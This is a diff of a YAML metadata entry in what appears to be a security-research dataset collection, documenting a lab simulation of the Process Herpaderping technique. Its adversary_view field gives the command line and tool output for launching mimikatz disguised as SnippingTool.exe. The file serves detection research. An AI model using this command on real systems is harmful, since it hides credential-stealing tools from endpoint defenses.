@@ -1,4 +1,4 @@
-title: Process Herpaderping Mimikatz IExplorer
+title: Process Herpaderping Mimikatz
 id: SDWIN-201026235835
 author: Roberto Rodriguez @Cyb3rWard0g
 creation_date: 2020/10/26
@@ -15,7 +15,7 @@ attack_mappings:
 notebooks:
 files:
 - type: Host
-  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/cmd_process_herpaderping_mimiexplorer.zip
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/cmd_process_herpaderping_snippingtool.zip
 simulation:
   environment: Lab VM
   tools:
@@ -26,21 +26,26 @@ simulation:
   permissions_required:
     - Administrator
   adversary_view: |-
-    C:\Users\wardog\Desktop>ProcessHerpaderping.exe mimikatz.exe wardog.exe "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
+    C:\Users\wardog>cd Desktop
+
+    C:\Users\wardog\Desktop>ProcessHerpaderping.exe mimikatz.exe wardog.exe C:\Windows\system32\SnippingTool.exe
     Process Herpaderping Tool - Copyright (c) 2020 Johnny Shaw
-    [13032:12676][OK]    Source File: "mimikatz.exe"
-    [13032:12676][OK]    Target File: "wardog.exe"
-    [13032:12676][INFO]  Copied source binary to target file
-    [13032:12676][INFO]  Created image section for target
-    [13032:12676][INFO]  Created process object, PID 5512
-    [13032:12676][INFO]  Located target image entry RVA 0x000c3aec
-    [13032:12676][OK]    Replacing target with "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
-    [13032:12676][INFO]  Fixing up target replacement, hiding original bytes and retaining any signature
-    [13032:12676][OK]    Preparing target for execution
-    [13032:12676][INFO]  Writing process parameters, remote PEB ProcessParameters 0x0000000000372020
-    [13032:12676][INFO]  Creating thread in process at entry point 0x00007FF7C07F3AEC
-    [13032:12676][INFO]  Created thread, TID 1996
-    [13032:12676][OK]    Waiting for herpaderped process to exit
+    [12140:10252][OK]    Source File: "mimikatz.exe"
+    [12140:10252][OK]    Target File: "wardog.exe"
+    [12140:10252][INFO]  Copied source binary to target file
+    [12140:10252][INFO]  Created image section for target
+    [12140:10252][INFO]  Created process object, PID 8924
+    [12140:10252][INFO]  Located target image entry RVA 0x000c3aec
+    [12140:10252][OK]    Replacing target with "C:\Windows\system32\SnippingTool.exe"
+    [12140:10252][OK]    Preparing target for execution
+    [12140:10252][INFO]  Writing process parameters, remote PEB ProcessParameters 0x0000000000AED020
+    [12140:10252][INFO]  Creating thread in process at entry point 0x00007FF733E63AEC
+    [12140:10252][INFO]  Created thread, TID 12112
+    [12140:10252][OK]    Waiting for herpaderped process to exit
+    [12140:10252][OK]    Herpaderped process exited with code 0xc000013a
+    [12140:10252][OK]    Process Herpaderp Succeeded
+
+    C:\Users\wardog\Desktop>
 references:
   - https://github.com/jxy-s/herpaderping
   - https://twitter.com/jxy__s/status/1320853852153769984
